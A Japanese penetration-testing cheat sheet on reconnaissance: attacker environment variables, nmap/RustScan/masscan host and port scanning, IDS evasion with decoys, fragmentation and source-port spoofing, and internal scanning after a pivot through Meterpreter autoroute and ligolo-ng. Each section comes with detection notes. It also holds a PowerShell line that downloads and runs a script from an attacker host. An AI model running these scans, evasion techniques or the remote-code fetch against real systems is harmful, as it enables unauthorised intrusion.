01Attacker Context攻撃元コンテキスト

ターゲット到達前に環境変数を確定させる。以降のセクションのコマンドは $TARGET / $RANGE / $LHOST を前提。

LHOST 動的取得 (VPN tun0)

bash
ip a show tun0 | grep "inet " | awk '{print $2}' | cut -d/ -f1

# 変数化
export LHOST=$(ip a show tun0 | grep "inet " | awk '{print $2}' | cut -d/ -f1)
echo $LHOST

ターゲット環境変数化

bash
export TARGET=10.10.10.10
export RANGE=10.10.10.0/24

# 作業ディレクトリ (日付ベース)
mkdir -p ~/recon/$(date +%Y%m%d)/{scans,loot,exploits,notes}
cd ~/recon/$(date +%Y%m%d)

02Host Discoveryホスト発見

nmap ping sweep パターン

bash
# ARP スキャン (同一セグメント、最速・最正確)
sudo nmap -sn -PR $RANGE -oN scans/host_arp.txt

# ICMP スキャン (ルータ越え)
sudo nmap -sn -PE $RANGE -oN scans/host_icmp.txt

# TCP SYN ping (ICMP ブロック環境)
sudo nmap -sn -PS22,80,443,445,3389 $RANGE -oN scans/host_tcpping.txt

# UDP ping (DNS ポート経由)
sudo nmap -sn -PU53 $RANGE -oN scans/host_udpping.txt

# 包括スキャン (全方式組合せ + ソースポート偽装)
sudo nmap -sn -PE -PS21,22,23,25,80,113,31339 -PA80,113,443,10042 \
  --source-port 53 $RANGE -oN scans/host_combo.txt

netdiscover (ARP 特化、パッシブ可)

bash
# パッシブモード (受動的 ARP 観察)
sudo netdiscover -i tun0 -r $RANGE -p

# アクティブモード
sudo netdiscover -i tun0 -r $RANGE

fping (高速、マルチホスト)

bash
fping -a -g $RANGE 2>/dev/null

masscan (大規模ネットワーク)

bash
# 10.0.0.0/8 級の広域スキャンに
sudo masscan -p80,443,445,3389 $RANGE --rate=1000 -oL scans/masscan_hosts.txt
検知 / detection
  • ARP スイープ: NIDS で短時間 (数秒) の連続 ARP request を閾値検知
  • ICMP エコー広域: firewall で ICMP echo を選択的ドロップ、ネットワーク境界で volumetric anomaly を SIEM 連携
  • TCP SYN ping: honeypot ホストを配置し、closed port への SYN 到達をカウント
  • ソースポート 53 の TCP SYN は正規トラフィックにはほぼ現れない → 高信頼シグナル

03Port Scanningポートスキャン

RustScan (高速初動、推奨)

全ポート高速検出 → 発見ポートを nmap に自動パイプ。参考: RustScan/RustScan

bash
# TCP 全ポート高速 → nmap sV/sC/Pn へ自動パイプ
rustscan --accessible -a $TARGET -r 1-65535 -- -sT -sV -sC -Pn -oN scans/rustscan.txt

# 複数ホスト並列
rustscan -a 10.10.10.10,10.10.10.20,10.10.10.30 -r 1-65535 -- -sC -sV

# ulimit 警告回避
rustscan -a $TARGET -r 1-65535 --ulimit 5000 -- -sC -sV

nmap 3 段階パターン

第 1 段階: TCP 全ポート高速スキャン

bash
# SYN スキャン (要 root、最高速)
sudo nmap -p- -sS --min-rate=5000 --max-retries=1 -Pn -n -T4 -oG scans/all_ports.gnmap $TARGET

# Connect スキャン (root 不要)
nmap -p- -T4 -n -Pn --open $TARGET -oN scans/all_ports.txt

# 検出ポートを変数化
export PORTS=$(grep '^Ports:' scans/all_ports.gnmap | tr ',' '\n' | grep open | awk -F'/' '{print $1}' | tr -d ' ' | paste -sd, -)
echo $PORTS

第 2 段階: 詳細サービス検出

bash
sudo nmap -p $PORTS -sV -sC -A -Pn -oN scans/detailed.txt -oX scans/detailed.xml $TARGET

# vuln スクリプト実行 (長時間)
sudo nmap -p $PORTS -sV -sC --script vuln -Pn -oN scans/vuln_scan.txt $TARGET

第 3 段階: UDP スキャン (必須)

bash
# TOP 100 UDP
sudo nmap -sU --top-ports 100 -Pn -n --min-rate=1000 -oN scans/udp_top100.txt $TARGET

# 特定 UDP (SNMP / DNS / NetBIOS / IKE / SLP)
sudo nmap -sU -p 53,67,68,69,123,137,138,161,162,500,514,1900,4500,5353 -sV \
  -oN scans/udp_specific.txt $TARGET

timing オプション

タイミング説明用途
-T0 (paranoid)5 分間隔IDS 極限回避
-T1 (sneaky)15 秒間隔IDS 回避
-T2 (polite)0.4 秒間隔帯域節約
-T3 (normal)デフォルト通常
-T4 (aggressive)高速実運用の既定値
-T5 (insane)最速結果精度低下

Firewall / IDS 回避

bash
# ソースポート偽装 (DNS 送信元装う)
sudo nmap -g53 -p- --max-retries=1 -Pn --disable-arp-ping $TARGET

# パケット断片化
sudo nmap -f -p 80,443 $TARGET
sudo nmap --mtu 24 -p 80,443 $TARGET

# デコイ (ソース IP 偽装、囮 10 個)
sudo nmap -D RND:10 -p 80,443 $TARGET

# 遅延・ランダム化
sudo nmap -T1 --scan-delay 1s --max-retries=1 -Pn $TARGET

# ホスト発見無効化
sudo nmap -Pn --disable-arp-ping -p53 -sU -sC $TARGET
検知 / detection
  • SYN スキャン: TCP フラグに RST 応答が連続する場合、Zeek / Suricata で scan.log に記録
  • ソースポート 53 の TCP: DNS の TCP 応答以外で source port 53 が来るのは異常
  • MTU 24 の断片化パケット: firewall で全断片化パケットを block / alert
  • RND:10 デコイ: 同時期に同一パターンのスキャンが複数ソース IP から到達 → SIEM で相関

検知 / detection

06Internal Recon (Post-Pivot)ピボット後の内部偵察

foothold 取得後、内部セグメントの偵察に移る。pivoting の setup 詳細 (chisel / ligolo-ng の proxy/agent 起動、SOCKS 経路構成) は lateral-movement sheet を参照。ここでは「トンネルが張られた状態」からのスキャン手段を扱う。

Windows 侵害ホストからの内部スキャン

Invoke-Portscan (PowerSploit):

powershell
IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/Invoke-Portscan.ps1')

Invoke-Portscan -Hosts 10.10.20.0/24 \
  -Ports "21,22,23,53,80,88,135,139,389,443,445,1433,3306,3389,5985,5986,8080" \
  | Select -ExpandProperty openPorts

PowerShell ネイティブ (Test-NetConnection):

powershell
# 単一ホスト・複数ポート
1..1024 | ForEach-Object {
    $r = Test-NetConnection -ComputerName 10.10.20.10 -Port $_ \
      -WarningAction SilentlyContinue -InformationLevel Quiet
    if ($r) { "Port $_ open" }
}

# レンジスキャン (主要ポート)
$ports = 21,22,80,135,139,389,443,445,1433,3306,3389,5985,8080
1..254 | ForEach-Object {
    $ip = "10.10.20.$_"
    foreach ($port in $ports) {
        $r = Test-NetConnection -ComputerName $ip -Port $port \
          -WarningAction SilentlyContinue -InformationLevel Quiet
        if ($r) { "$ip`:$port open" }
    }
}

Kali 側からのトンネル経由スキャン

Metasploit autoroute + SOCKS:

bash
# Meterpreter セッション内
meterpreter> run autoroute -s 10.10.20.0/24
meterpreter> background

msf> use auxiliary/server/socks_proxy
msf> set VERSION 4a
msf> set SRVPORT 1080
msf> run -j

# /etc/proxychains4.conf: socks4 127.0.0.1 1080
proxychains nmap -sT -Pn -n --max-retries 1 -p 445,3389,5985 10.10.20.0/24

ligolo-ng 経由 (高速、推奨): proxy/agent の setup は lateral-movement sheet 参照。tunnel 確立後は proxychains 不要で直接 nmap が通る。

bash
# tunnel 確立後の直接スキャン
sudo ip route add 10.10.20.0/24 dev ligolo
sudo nmap -sT -Pn -n 10.10.20.0/24 -p 445,3389,5985
要点 / key takeaways
  • 偵察は kill chain の最上流。ここでの取得情報が下流の全 sheet (AD / lateral / web / evasion) の手法選択を決める
  • UDP スキャンは省略しやすいが SNMP / DNS / NetBIOS など UDP 側にしかない発見が多い、必ず含める
  • 外部から見える enumeration (SMB null session / SNMP public / anonymous LDAP) は環境の防御レベルの指標
  • SPN / LAPS / kerberoast 候補は LDAP 段階で既に取得できる、AD sheet の攻撃実行前に情報を蓄積
  • ピボット後は Windows 内で PowerShell native (Test-NetConnection) を優先し、外部 nmap 転送は最小化 (LOLBAS / AV 検知リスク回避)
  • tunnel の種類 (SOCKS via proxychains / ligolo-ng L3 route) でスキャン速度と対象範囲が変わる、環境に応じて選択
  • ホスト間ピボットの都度、Section 01 (環境変数の再設定) と Section 02 (host discovery) を各セグメントで再実行
